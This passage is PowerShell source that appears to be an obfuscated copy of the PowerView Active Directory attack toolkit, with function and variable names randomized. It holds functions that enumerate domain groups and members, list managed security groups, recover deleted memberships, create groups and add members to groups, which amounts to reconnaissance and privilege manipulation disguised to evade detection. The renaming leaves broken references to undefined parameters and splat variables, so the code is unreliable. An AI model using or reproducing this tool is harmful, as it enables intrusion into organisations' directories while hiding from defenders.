                            $XVFWmInN99['Domain'] = $CtdjjEVe99
                            $edvQoMcf99 = maroons @SearcherArguments
                            if (-not $edvQoMcf99) {
                                Write-Warning "[con] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                            }
                        }
                    }
                    elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                    }
                    elseif ($vNrdYYXO99.Contains('\')) {
                        $amRsUbps99 = $vNrdYYXO99.Replace('\28', '(').Replace('\29', ')') | offings -EsfqZxkA99 Canonical
                        if ($amRsUbps99) {
                            $UKHCiigJ99 = $amRsUbps99.SubString(0, $amRsUbps99.IndexOf('/'))
                            $EidYTRyh99 = $vNrdYYXO99.Split('\')[1]
                            $igkjuUBu99 += "(samAccountName=$EidYTRyh99)"
                            $XVFWmInN99['Domain'] = $UKHCiigJ99
                            Write-Verbose "[con] Extracted domain '$UKHCiigJ99' from '$vNrdYYXO99'"
                            $edvQoMcf99 = maroons @SearcherArguments
                        }
                    }
                    else {
                        $igkjuUBu99 += "(|(samAccountName=$vNrdYYXO99)(name=$vNrdYYXO99))"
                    }
                }
                if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                    $pIJjStMG99 += "(|$igkjuUBu99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[con] Searching for adminCount=1'
                    $pIJjStMG99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $MJGHihRG99 = $PSBoundParameters['GroupScope']
                    $pIJjStMG99 = Switch ($MJGHihRG99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[con] Searching for group scope '$MJGHihRG99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $tQEJjeZx99 = $PSBoundParameters['GroupProperty']
                    $pIJjStMG99 = Switch ($tQEJjeZx99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[con] Searching for group property '$tQEJjeZx99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[con] Using additional LDAP filter: $SeHRgLsL99"
                    $pIJjStMG99 += "$SeHRgLsL99"
                }
                $edvQoMcf99.filter = "(&(objectCategory=group)$pIJjStMG99)"
                Write-Verbose "[con] filter string: $($edvQoMcf99.filter)"
                if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $edvQoMcf99.FindOne() }
                else { $CmGXBhUd99 = $edvQoMcf99.FindAll() }
                $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = foregather -ycQOyvWh99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($CmGXBhUd99) {
                    try { $CmGXBhUd99.dispose() }
                    catch {
                        Write-Verbose "[con] Error disposing of the Results object"
                    }
                }
                $edvQoMcf99.dispose()
            }
        }
    }
}
function teleconferenced {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $jFhxwutu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $GylpOMIi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AGwIAYxa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $VmQxvGKA99 = @{
        'Identity' = $jFhxwutu99
    }
    if ($PSBoundParameters['Domain']) { $VmQxvGKA99['Domain'] = $jnYnRnFJ99 }
    if ($PSBoundParameters['Credential']) { $VmQxvGKA99['Credential'] = $fjBNCklg99 }
    $EOHvLUHq99 = Timur @ContextArguments
    if ($EOHvLUHq99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($EOHvLUHq99.Context)
        $Group.SamAccountName = $EOHvLUHq99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $EOHvLUHq99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $GylpOMIi99
        }
        else {
            $Group.DisplayName = $EOHvLUHq99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $AGwIAYxa99
        }
        Write-Verbose "[teleconferenced] Attempting to create group '$jFhxwutu99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[teleconferenced] Group '$jFhxwutu99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[teleconferenced] Error creating group '$jFhxwutu99' : $_"
        }
    }
}
function belaying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $XVFWmInN99['Domain'] = $jnYnRnFJ99
            $TDntIjFc99 = $jnYnRnFJ99
        }
        else {
            $TDntIjFc99 = $Env:USERDNSDOMAIN
        }
        con @SearcherArguments | ForEach-Object {
            $XVFWmInN99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $XVFWmInN99['Identity'] = $_.managedBy
            $Null = $XVFWmInN99.Remove('LDAPFilter')
            $TYswWzZN99 = trashier @SearcherArguments
            $UPuOkodd99 = New-Object PSObject
            $UPuOkodd99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $UPuOkodd99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $UPuOkodd99 | Add-Member Noteproperty 'ManagerName' $TYswWzZN99.samaccountname
            $UPuOkodd99 | Add-Member Noteproperty 'ManagerDistinguishedName' $TYswWzZN99.distinguishedName
            if ($TYswWzZN99.samaccounttype -eq 0x10000000) {
                $UPuOkodd99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($TYswWzZN99.samaccounttype -eq 0x30000000) {
                $UPuOkodd99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $xiLKRAfK99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $xiLKRAfK99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['SearchScope']) { $xiLKRAfK99['SearchScope'] = $TRVzBsDk99 }
            if ($PSBoundParameters['ResultPageSize']) { $xiLKRAfK99['ResultPageSize'] = $CgYkCByk99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $xiLKRAfK99['ServerTimeLimit'] = $elDiVqTz99 }
            if ($PSBoundParameters['Tombstone']) { $xiLKRAfK99['Tombstone'] = $rmzHuzlC99 }
            if ($PSBoundParameters['Credential']) { $xiLKRAfK99['Credential'] = $fjBNCklg99 }
            $UPuOkodd99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $UPuOkodd99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $UPuOkodd99
        }
    }
}
function Mapplethorpe {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $xTBamVOW99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $voKBnYeJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $EufoKtXA99 = @{}
        if ($PSBoundParameters['Domain']) { $EufoKtXA99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $EufoKtXA99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Credential']) { $EufoKtXA99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        $edvQoMcf99 = maroons @SearcherArguments
        if ($edvQoMcf99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $XVFWmInN99['Identity'] = $feaYcbZI99
                $XVFWmInN99['Raw'] = $True
                $Group = con @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[Mapplethorpe] Error searching for group with identity: $feaYcbZI99"
                }
                else {
                    $yxluSmKX99 = $Group.properties.item('samaccountname')[0]
                    $LzpllmrG99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $geFoIFyV99 = $jnYnRnFJ99
                    }
                    else {
                        if ($LzpllmrG99) {
                            $geFoIFyV99 = $LzpllmrG99.SubString($LzpllmrG99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Mapplethorpe] Using LDAP matching rule to recurse on '$LzpllmrG99', only user accounts will be returned."
                    $edvQoMcf99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$LzpllmrG99))"
                    $edvQoMcf99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $VztYncUI99 = $edvQoMcf99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $XVFWmInN99.Remove('Raw')
            }
            else {
                $igkjuUBu99 = ''
                $pIJjStMG99 = ''
                $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                    $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($vNrdYYXO99 -match '^S-1-') {
                        $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                    }
                    elseif ($vNrdYYXO99 -match '^CN=') {
                        $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Mapplethorpe] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                            $XVFWmInN99['Domain'] = $CtdjjEVe99
                            $edvQoMcf99 = maroons @SearcherArguments
                            if (-not $edvQoMcf99) {
                                Write-Warning "[Mapplethorpe] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                            }
                        }
                    }
                    elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                    }
                    elseif ($vNrdYYXO99.Contains('\')) {
                        $amRsUbps99 = $vNrdYYXO99.Replace('\28', '(').Replace('\29', ')') | offings -EsfqZxkA99 Canonical
                        if ($amRsUbps99) {
                            $UKHCiigJ99 = $amRsUbps99.SubString(0, $amRsUbps99.IndexOf('/'))
                            $EidYTRyh99 = $vNrdYYXO99.Split('\')[1]
                            $igkjuUBu99 += "(samAccountName=$EidYTRyh99)"
                            $XVFWmInN99['Domain'] = $UKHCiigJ99
                            Write-Verbose "[Mapplethorpe] Extracted domain '$UKHCiigJ99' from '$vNrdYYXO99'"
                            $edvQoMcf99 = maroons @SearcherArguments
                        }
                    }
                    else {
                        $igkjuUBu99 += "(samAccountName=$vNrdYYXO99)"
                    }
                }
                if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                    $pIJjStMG99 += "(|$igkjuUBu99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Mapplethorpe] Using additional LDAP filter: $SeHRgLsL99"
                    $pIJjStMG99 += "$SeHRgLsL99"
                }
                $edvQoMcf99.filter = "(&(objectCategory=group)$pIJjStMG99)"
                Write-Verbose "[Mapplethorpe] Mapplethorpe filter string: $($edvQoMcf99.filter)"
                try {
                    $tYBpqgGN99 = $edvQoMcf99.FindOne()
                }
                catch {
                    Write-Warning "[Mapplethorpe] Error searching for group with identity '$feaYcbZI99': $_"
                    $VztYncUI99 = @()
                }
                $yxluSmKX99 = ''
                $LzpllmrG99 = ''
                if ($tYBpqgGN99) {
                    $VztYncUI99 = $tYBpqgGN99.properties.item('member')
                    if ($VztYncUI99.count -eq 0) {
                        $CvLvAsVh99 = $False
                        $FkbEWqYe99 = 0
                        $Top = 0
                        while (-not $CvLvAsVh99) {
                            $Top = $FkbEWqYe99 + 1499
                            $bbEHRbZb99="member;range=$FkbEWqYe99-$Top"
                            $FkbEWqYe99 += 1500
                            $Null = $edvQoMcf99.PropertiesToLoad.Clear()
                            $Null = $edvQoMcf99.PropertiesToLoad.Add("$bbEHRbZb99")
                            $Null = $edvQoMcf99.PropertiesToLoad.Add('samaccountname')
                            $Null = $edvQoMcf99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $tYBpqgGN99 = $edvQoMcf99.FindOne()
                                $cDEiXInR99 = $tYBpqgGN99.Properties.PropertyNames -like "member;range=*"
                                $VztYncUI99 += $tYBpqgGN99.Properties.item($cDEiXInR99)
                                $yxluSmKX99 = $tYBpqgGN99.properties.item('samaccountname')[0]
                                $LzpllmrG99 = $tYBpqgGN99.properties.item('distinguishedname')[0]
                                if ($VztYncUI99.count -eq 0) {
                                    $CvLvAsVh99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $CvLvAsVh99 = $True
                            }
                        }
                    }
                    else {
                        $yxluSmKX99 = $tYBpqgGN99.properties.item('samaccountname')[0]
                        $LzpllmrG99 = $tYBpqgGN99.properties.item('distinguishedname')[0]
                        $VztYncUI99 += $tYBpqgGN99.Properties.item($cDEiXInR99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $geFoIFyV99 = $jnYnRnFJ99
                    }
                    else {
                        if ($LzpllmrG99) {
                            $geFoIFyV99 = $LzpllmrG99.SubString($LzpllmrG99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($AJyGNBNz99 in $VztYncUI99) {
                if ($xTBamVOW99 -and $nKAMyFby99) {
                    $ycQOyvWh99 = $_.Properties
                }
                else {
                    $WaxTRsWi99 = $XVFWmInN99.Clone()
                    $WaxTRsWi99['Identity'] = $AJyGNBNz99
                    $WaxTRsWi99['Raw'] = $True
                    $WaxTRsWi99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = trashier @ObjectSearcherArguments
                    $ycQOyvWh99 = $Object.Properties
                }
                if ($ycQOyvWh99) {
                    $FQUwUtkT99 = New-Object PSObject
                    $FQUwUtkT99 | Add-Member Noteproperty 'GroupDomain' $geFoIFyV99
                    $FQUwUtkT99 | Add-Member Noteproperty 'GroupName' $yxluSmKX99
                    $FQUwUtkT99 | Add-Member Noteproperty 'GroupDistinguishedName' $LzpllmrG99
                    if ($ycQOyvWh99.objectsid) {
                        $FPYfcegl99 = ((New-Object System.Security.Principal.SecurityIdentifier $ycQOyvWh99.objectsid[0], 0).Value)
                    }
                    else {
                        $FPYfcegl99 = $Null
                    }
                    try {
                        $ONkQxdlh99 = $ycQOyvWh99.distinguishedname[0]
                        if ($ONkQxdlh99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $FPYfcegl99) {
                                    $FPYfcegl99 = $ycQOyvWh99.cn[0]
                                }
                                $dNKBnqKD99 = offings -feaYcbZI99 $FPYfcegl99 -EsfqZxkA99 'DomainSimple' @ADNameArguments
                                if ($dNKBnqKD99) {
                                    $KgjZCYLu99 = $dNKBnqKD99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Mapplethorpe] Error converting $ONkQxdlh99"
                                    $KgjZCYLu99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Mapplethorpe] Error converting $ONkQxdlh99"
                                $KgjZCYLu99 = $Null
                            }
                        }
                        else {
                            $KgjZCYLu99 = $ONkQxdlh99.SubString($ONkQxdlh99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $ONkQxdlh99 = $Null
                        $KgjZCYLu99 = $Null
                    }
                    if ($ycQOyvWh99.samaccountname) {
                        $AeVkKzDb99 = $ycQOyvWh99.samaccountname[0]
                    }
                    else {
                        try {
                            $AeVkKzDb99 = belonging -ObjectSID $ycQOyvWh99.cn[0] @ADNameArguments
                        }
                        catch {
                            $AeVkKzDb99 = $ycQOyvWh99.cn[0]
                        }
                    }
                    if ($ycQOyvWh99.objectclass -match 'computer') {
                        $dWEkDziG99 = 'computer'
                    }
                    elseif ($ycQOyvWh99.objectclass -match 'group') {
                        $dWEkDziG99 = 'group'
                    }
                    elseif ($ycQOyvWh99.objectclass -match 'user') {
                        $dWEkDziG99 = 'user'
                    }
                    else {
                        $dWEkDziG99 = $Null
                    }
                    $FQUwUtkT99 | Add-Member Noteproperty 'MemberDomain' $KgjZCYLu99
                    $FQUwUtkT99 | Add-Member Noteproperty 'MemberName' $AeVkKzDb99
                    $FQUwUtkT99 | Add-Member Noteproperty 'MemberDistinguishedName' $ONkQxdlh99
                    $FQUwUtkT99 | Add-Member Noteproperty 'MemberObjectClass' $dWEkDziG99
                    $FQUwUtkT99 | Add-Member Noteproperty 'MemberSID' $FPYfcegl99
                    $FQUwUtkT99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $FQUwUtkT99
                    if ($PSBoundParameters['Recurse'] -and $ONkQxdlh99 -and ($dWEkDziG99 -match 'group')) {
                        Write-Verbose "[Mapplethorpe] Manually recursing on group: $ONkQxdlh99"
                        $XVFWmInN99['Identity'] = $ONkQxdlh99
                        $Null = $XVFWmInN99.Remove('Properties')
                        Mapplethorpe @SearcherArguments
                    }
                }
            }
            $edvQoMcf99.dispose()
        }
    }
}
function tidier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $XVFWmInN99['Identity'] = $feaYcbZI99 }
        trashier @SearcherArguments | ForEach-Object {
            $GXfnLfMX99 = $_.Properties['distinguishedname'][0]
            ForEach($JiEhDHSa99 in $_.Properties['msds-replvaluemetadata']) {
                $mNYJTdZw99 = [xml]$JiEhDHSa99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($mNYJTdZw99) {
                    if (($mNYJTdZw99.pszAttributeName -Match 'member') -and (($mNYJTdZw99.dwVersion % 2) -eq 0 )) {
                        $YrLtLWOk99 = New-Object PSObject
                        $YrLtLWOk99 | Add-Member NoteProperty 'GroupDN' $GXfnLfMX99
                        $YrLtLWOk99 | Add-Member NoteProperty 'MemberDN' $mNYJTdZw99.pszObjectDn
                        $YrLtLWOk99 | Add-Member NoteProperty 'TimeFirstAdded' $mNYJTdZw99.ftimeCreated
                        $YrLtLWOk99 | Add-Member NoteProperty 'TimeDeleted' $mNYJTdZw99.ftimeDeleted
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingChange' $mNYJTdZw99.ftimeLastOriginatingChange
                        $YrLtLWOk99 | Add-Member NoteProperty 'TimesAdded' ($mNYJTdZw99.dwVersion / 2)
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $mNYJTdZw99.pszLastOriginatingDsaDN
                        $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $YrLtLWOk99
                    }
                }
                else {
                    Write-Verbose "[tidier] Error retrieving 'msds-replvaluemetadata' for '$GXfnLfMX99'"
                }
            }
        }
    }
}
function aureole {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $feaYcbZI99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $VztYncUI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VmQxvGKA99 = @{
            'Identity' = $feaYcbZI99
        }
        if ($PSBoundParameters['Domain']) { $VmQxvGKA99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Credential']) { $VmQxvGKA99['Credential'] = $fjBNCklg99 }
        $KXpFcMcO99 = Timur @ContextArguments
        if ($KXpFcMcO99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($KXpFcMcO99.Context, $KXpFcMcO99.Identity)
            }
            catch {
                Write-Warning "[aureole] Error finding the group identity '$feaYcbZI99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($AJyGNBNz99 in $VztYncUI99) {
                if ($AJyGNBNz99 -match '.+\\.+') {
                    $VmQxvGKA99['Identity'] = $AJyGNBNz99
                    $TpSLkOnC99 = Timur @ContextArguments
                    if ($TpSLkOnC99) {
                        $Ymfcwbqe99 = $TpSLkOnC99.Identity
                    }
                }
                else {
                    $TpSLkOnC99 = $KXpFcMcO99
                    $Ymfcwbqe99 = $AJyGNBNz99
                }
                Write-Verbose "[aureole] Adding member '$AJyGNBNz99' to group '$feaYcbZI99'"
                $AJyGNBNz99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($TpSLkOnC99.Context, $Ymfcwbqe99)
                $Group.Members.Add($AJyGNBNz99)
                $Group.Save()
            }
        }
    }
}
function Diogenes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $feaYcbZI99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $VztYncUI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
